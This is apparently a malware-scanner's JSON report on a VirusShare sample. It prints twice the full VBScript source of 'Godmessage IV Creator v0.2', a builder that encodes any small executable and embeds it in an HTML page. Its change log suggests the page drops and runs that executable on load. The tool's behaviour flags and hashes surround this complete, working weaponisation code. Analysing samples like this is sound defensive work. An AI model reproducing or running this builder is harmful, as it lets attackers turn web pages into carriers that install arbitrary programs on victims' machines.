{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Chr": "May attempt to obfuscate specific str",
            "CopyFile": "May copy a file",
            "CreateObject": "May create an OLE object",
            "CreateTextFile": "May create a text file",
            "Run": "May run an executable file or a system command",
            "Shell": "May run an executable file or a system command",
            "WScript.Shell": "May run an executable file or a system command",
            "Write": "May write to a file",
            "call": "May call a DLL using Excel 4 Macros",
            "output": "May write to a file"
        },
        "macro": "'********************************************************************\n' Godmessage IV Creator v0.2\n' Author: 6IT\n' Thanks: The Pull - Creator of the original Godmessage - this is his brain child.\n' Thanks: StoneFisk - Coauthor of Godmessage IV. his hex2script VB code helped with writing this\n' Thanks: Al McLennan - For his LCODER program, without it this wouldn't be possible\n' Thanks: To all the people who helped make godmessage what it is today\n'  \n' CHANGE lOG 10-12-00\n' GODMESSAGE IV\n' - Deleted the setTimeout call of f() and replaced it with a call from the onload property of the BODY element. \n' - Set the remaining setTimeouts to 15, 3000, and 4500 respectively. \n' - Cleaned up the VBScript code a bit, used fso.DeleteFile to clean up files\n' - A few other tweaks here and there\n'\n' GMCreator \n' - encode onz.exe using XXE (onz.xfr)\n' - increased file size limit to 26000 bytes (thanks to XXEncoding)\n' TODO\n' - Optimize Godmessage code, remove unnessisary chars to make file smaller and raise onz.exe size limit\n' - Possibly dynamically create godmessage from user supplied html file\n'********************************************************************\nDim Message, Title, Text1\nDim fso, WSHSHell, result\nMessage = \"Enter the name of the executable to wrap in Godmessage IV\" \nTitle = \"6IT's Godmessage IV Creator v0.1\"\nText1 = \"Sorry, user input was canceled\"\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nSet WSHShell = WScript.CreateObject(\"WScript.Shell\")\nConst ForReading = 1 \nConst ForAppending = 8\nresult = InputBox(Message,Title,\"onz.exe\", 4000, 3000)\nIf result = \"\" Then\n\tWScript.Echo Text1\n\tWScript.Quit()\nElseIf result = \"onz.exe\" Then\n\n\tIf fso.FileExists(result) Then \n\t\tGMCreate()\n\tElse \n\t\tWScript.Echo \"File Doesn't Exist!\"\n\t\tWScript.Quit()\n\tEnd If\nElse\n\tIf fso.FileExists(result) Then\n\t\tfso.CopyFile result, \"onz.exe\", True\n\t\tGMCreate()\n\tElse \n\t\tWScript.Echo \"File Doesn't Exist!\"\n\t\tWScript.Quit()\n\tEnd If\nEnd If\nWScript.Echo \"Success!\"\nWScript.Quit()\n\nSub GMCreate()\nCheckSize()\nCreateHex()\nCreateScript()\nJoin()\nfso.DeleteFile \"stdio.txt\", True\nfso.DeleteFile \"onz.xfr\", True\nfso.DeleteFile \"output.txt\", True\nEnd Sub\n\nSub CheckSize()\nSet fs = fso.GetFile(\"onz.exe\")\nfsize = fs.Size\nIF fsize > 26000 Then\nWScript.Echo \"File is Greater Than 26000 Bytes\"\nWScript.Quit()\nEnd If\nEnd Sub\n\nSub CreateHex()\nDim stdioTxt\n' create standard input file stdio.txt\nset stdioTxt=fso.CreateTextFile(\"stdio.txt\", True)\nstdioTxt.WriteLine \"echo\" & Chr(27) & \"onz.exe\" & vbNewline & \"X\" & vbNewline & \"Y\" & vbNewline& \"echo\"\nstdioTxt.close\nIf fso.FileExists(\"onz.xfr\") Then \nfso.DeleteFile \"onz.xfr\", True\nEnd If\nWSHShell.Run \"%comspec% /c lcoder.exe < stdio.txt\",0,True\n\nEnd Sub\n\nSub CreateScript()\nSet input = fso.OpenTextFile(\"onz.xfr\", ForReading) \nSet output = fso.CreateTextFile(\"output.txt\", True)\nnline = \" & vbNewline\"\ns = input.ReadLine\nfline1 = \"l23 = \"\"set onzXfr=fso.CreateTextFile(\" & Chr(34) & Chr(34) & \"onz.xfr\" & Chr(34) & Chr(34) & \")\"\"\"\nfline2 = \"l24 = \"\"onzXfr.WriteLine \" & Chr(34) & Chr(34) & s & Chr(34) & Chr(34)\noutput.Write (fline1 & vbNewline & fline2 & nline)\nDo While NOT input.AtEndOfStream\ns = input.ReadLine\nIf s = \"\" Then\noutput.Write (nline)\nElse\nline = \" & \" & Chr(34) & Chr(34) & s & Chr(34) & Chr(34) \noutput.Write (line & nline)\nEnd IF\nLoop\noutput.Write (Chr(34) & vbNewline)\ninput.Close \noutput.Close\nEnd Sub\n\n\nSub Join() \n\nfso.CopyFile \"gm1.dat\", \"godmessage.html\", True\nSet f1 = fso.OpenTextFile(\"godmessage.html\", ForAppending)\nSet f2 = fso.OpenTextFile(\"output.txt\", ForReading)\nSet f3 = fso.OpenTextFile(\"gm2.dat\", ForReading)\ndat1 = f2.ReadAll\ndat2 = f3.ReadAll\nf1.Write(dat1 & dat2)\nf1.close\nf2.close\nf3.close\nEnd Sub"
    },
    "filename": "VirusShare_905a1620ecb07f15aef75cd764c14bc6",
    "filesize": 3807,
    "filetype": "ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "905a1620ecb07f15aef75cd764c14bc6",
        "sha1": "55169f5841e0c0c99ba8343c6c05f8e82fa50d8d",
        "sha256": "97e0895ca7d3289713abdc037813512ce6f863bc00ea4f697bd7fe5ea790433d"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "'********************************************************************",
            "' Godmessage IV Creator v0.2",
            "' Author: 6IT",
            "' Thanks: The Pull - Creator of the original Godmessage - this is his brain child.",
            "' Thanks: StoneFisk - Coauthor of Godmessage IV. his hex2script VB code helped with writing this",
            "' Thanks: Al McLennan - For his LCODER program, without it this wouldn't be possible",
            "' Thanks: To all the people who helped make godmessage what it is today",
            "' CHANGE lOG 10-12-00",
            "' GODMESSAGE IV",
            "' - Deleted the setTimeout call of f() and replaced it with a call from the onload property of the BODY element. ",
            "' - Set the remaining setTimeouts to 15, 3000, and 4500 respectively. ",
            "' - Cleaned up the VBScript code a bit, used fso.DeleteFile to clean up files",
            "' - A few other tweaks here and there",
            "' GMCreator ",
            "' - encode onz.exe using XXE (onz.xfr)",
            "' - increased file size limit to 26000 bytes (thanks to XXEncoding)",
            "' TODO",
            "' - Optimize Godmessage code, remove unnessisary chars to make file smaller and raise onz.exe size limit",
            "' - Possibly dynamically create godmessage from user supplied html file",
            "'********************************************************************",
            "Dim Message, Title, Text1",
            "Dim fso, WSHSHell, result",
            "Message = \"Enter the name of the executable to wrap in Godmessage IV\" ",
            "Title = \"6IT's Godmessage IV Creator v0.1\"",
            "Text1 = \"Sorry, user input was canceled\"",
            "Set fso = CreateObject(\"Scripting.FileSystemObject\")",
            "Set WSHShell = WScript.CreateObject(\"WScript.Shell\")",
            "Const ForReading = 1 ",
            "Const ForAppending = 8",
            "result = InputBox(Message,Title,\"onz.exe\", 4000, 3000)",
            "If result = \"\" Then",
            "\tWScript.Echo Text1",
            "\tWScript.Quit()",
            "ElseIf result = \"onz.exe\" Then",
            "\tIf fso.FileExists(result) Then ",
            "\t\tGMCreate()",
            "\tElse ",
            "\t\tWScript.Echo \"File Doesn't Exist!\"",
            "\t\tWScript.Quit()",
            "\tEnd If",
            "Else",
            "\tIf fso.FileExists(result) Then",
            "\t\tfso.CopyFile result, \"onz.exe\", True",
            "\t\tGMCreate()",
            "\tElse ",
            "\t\tWScript.Echo \"File Doesn't Exist!\"",
            "\t\tWScript.Quit()",
            "\tEnd If",
            "End If",
            "WScript.Echo \"Success!\"",
            "WScript.Quit()",
            "Sub GMCreate()",
            "CheckSize()",
            "CreateHex()",
            "CreateScript()",
            "Join()",
            "fso.DeleteFile \"stdio.txt\", True",
            "fso.DeleteFile \"onz.xfr\", True",
            "fso.DeleteFile \"output.txt\", True",
            "End Sub",
            "Sub CheckSize()",
            "Set fs = fso.GetFile(\"onz.exe\")",
            "fsize = fs.Size",
            "IF fsize > 26000 Then",
            "WScript.Echo \"File is Greater Than 26000 Bytes\"",
            "WScript.Quit()",
            "End If",
            "End Sub",
            "Sub CreateHex()",
            "Dim stdioTxt",
            "' create standard input file stdio.txt",
            "set stdioTxt=fso.CreateTextFile(\"stdio.txt\", True)",
            "stdioTxt.WriteLine \"echo\" & Chr(27) & \"onz.exe\" & vbNewline & \"X\" & vbNewline & \"Y\" & vbNewline& \"echo\"",
            "stdioTxt.close",
            "If fso.FileExists(\"onz.xfr\") Then ",
            "fso.DeleteFile \"onz.xfr\", True",
            "End If",
            "WSHShell.Run \"%comspec% /c lcoder.exe < stdio.txt\",0,True",
            "End Sub",
            "Sub CreateScript()",
            "Set input = fso.OpenTextFile(\"onz.xfr\", ForReading) ",
            "Set output = fso.CreateTextFile(\"output.txt\", True)",
            "nline = \" & vbNewline\"",
            "s = input.ReadLine",
            "fline1 = \"l23 = \"\"set onzXfr=fso.CreateTextFile(\" & Chr(34) & Chr(34) & \"onz.xfr\" & Chr(34) & Chr(34) & \")\"\"\"",
            "fline2 = \"l24 = \"\"onzXfr.WriteLine \" & Chr(34) & Chr(34) & s & Chr(34) & Chr(34)",
            "output.Write (fline1 & vbNewline & fline2 & nline)",
            "Do While NOT input.AtEndOfStream",
            "s = input.ReadLine",
            "If s = \"\" Then",
            "output.Write (nline)",
            "Else",
            "line = \" & \" & Chr(34) & Chr(34) & s & Chr(34) & Chr(34) ",
            "output.Write (line & nline)",
            "End IF",
            "Loop",
            "output.Write (Chr(34) & vbNewline)",
            "input.Close ",
            "output.Close",
            "End Sub",
            "Sub Join() ",
            "fso.CopyFile \"gm1.dat\", \"godmessage.html\", True",
            "Set f1 = fso.OpenTextFile(\"godmessage.html\", ForAppending)",
            "Set f2 = fso.OpenTextFile(\"output.txt\", ForReading)",
            "Set f3 = fso.OpenTextFile(\"gm2.dat\", ForReading)",
            "dat1 = f2.ReadAll",
            "dat2 = f3.ReadAll",
            "f1.Write(dat1 & dat2)",
            "f1.close",
            "f2.close",
            "f3.close",
            "End Sub"
        ],
        "file": {
            "' create standard input file stdio.txt": "Text"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.321090",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
